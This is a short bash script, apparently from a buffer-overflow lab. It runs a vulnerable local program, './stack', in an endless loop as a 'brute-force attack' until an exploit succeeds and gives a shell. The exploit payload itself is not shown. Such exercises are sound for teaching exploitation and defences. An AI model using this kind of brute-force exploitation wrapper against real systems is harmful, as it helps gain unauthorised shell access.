#!/bin/bash

# This script will run the vulnerable program in an infinite loop.
# We are waiting for a successful execution, which will give us a shell.
# Unsuccessful attempts will likely result in a "Segmentation fault".

ATTEMPTS=0
SUCCESS=0

echo "Starting brute-force attack... Press Ctrl+C to stop."

while [ $SUCCESS -eq 0 ]; do
  ATTEMPTS=$((ATTEMPTS+1))
  echo "Attempt: $ATTEMPTS"
  ./stack
done

echo "Attack may have succeeded if you gained a shell."

